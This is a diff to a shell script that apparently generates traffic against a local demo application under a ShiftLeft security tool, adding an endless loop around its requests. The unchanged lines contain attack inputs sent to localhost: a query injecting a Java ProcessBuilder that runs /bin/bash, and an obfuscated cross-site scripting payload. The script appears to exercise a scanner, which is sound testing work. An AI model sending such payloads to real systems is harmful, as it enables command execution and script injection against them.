@@ -5,6 +5,7 @@ sl run -- java -jar /var/jenkins_home/workspace/ShiftLeftDeveloperDemo/target/he
 
 sleep 60
 
+while true ; do \
 curl -s localhost:3030/customers/2 >/dev/null ;\
 sleep 5 ;\
 curl -s localhost:3030/customers/1 >/dev/null ;\
@@ -29,3 +30,5 @@ wget "localhost:3030/search/user?foo=new java.lang.ProcessBuilder({'/bin/bash','
 wget "localhost:3030/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=123&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432%3Cscriscriptpt%3Ealert(1)%3C/sscriptcript%3E" >&/dev/null ;\
 
 /bin/rm -f ./debug*
+sleep 4;
+done
